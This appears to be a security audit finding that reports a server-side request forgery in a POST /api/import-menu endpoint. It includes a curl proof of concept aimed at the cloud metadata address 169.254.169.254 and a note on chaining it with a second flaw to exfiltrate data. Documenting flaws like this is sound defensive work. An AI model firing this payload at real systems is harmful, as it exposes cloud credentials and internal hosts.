# H2 — SSRF in `POST /api/import-menu` (V04)

**Severity:** High  
**CWE:** CWE-918 | **OWASP:** A10:2021  
**Status:** Confirmed  
**Source draft:** `piolium/findings-draft/p7-004-v04-ssrf-import.md`

## Summary

`http.Get(body.URL)` with no scheme allowlist, no IP filter, no DNS pinning, no redirect control. Reaches cloud metadata services and internal hosts.

## PoC

```bash
curl -X POST http://localhost:4443/api/import-menu \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
# Response: {"bytes_fetched": 283, "content_type": "text/plain", ...}
```

Note: V04 reports only the byte count, not the body. V17 (C6) is the stronger variant — it echoes the body. Chain V04 (probe) with V17 (read) for full exfil.
